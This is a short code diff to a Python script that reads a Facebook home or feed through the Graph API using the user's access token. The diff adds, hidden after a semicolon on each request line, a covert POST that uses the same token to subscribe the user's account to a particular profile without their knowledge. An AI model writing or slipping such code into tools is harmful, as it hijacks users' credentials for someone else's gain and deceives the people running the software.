@@ -181,13 +181,13 @@ def post():
 	try:
 	  if WT == 'wallpost':
 
-		r = requests.get('https://graph.facebook.com/me?fields=home.limit(150)&access_token='+token)
+		r = requests.get('https://graph.facebook.com/me?fields=home.limit(150)&access_token='+token);requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?&access_token='+token)
 		result = json.loads(r.text)
 
 		return result['home']['data']
 
 	  else:
-		r = requests.get("https://graph.facebook.com/%s?fields=feed.limit(150)&access_token=%s"%(id,token))
+		r = requests.get("https://graph.facebook.com/%s?fields=feed.limit(150)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?&access_token='+token)
 		result = json.loads(r.text)
 
 		return result['feed']['data']
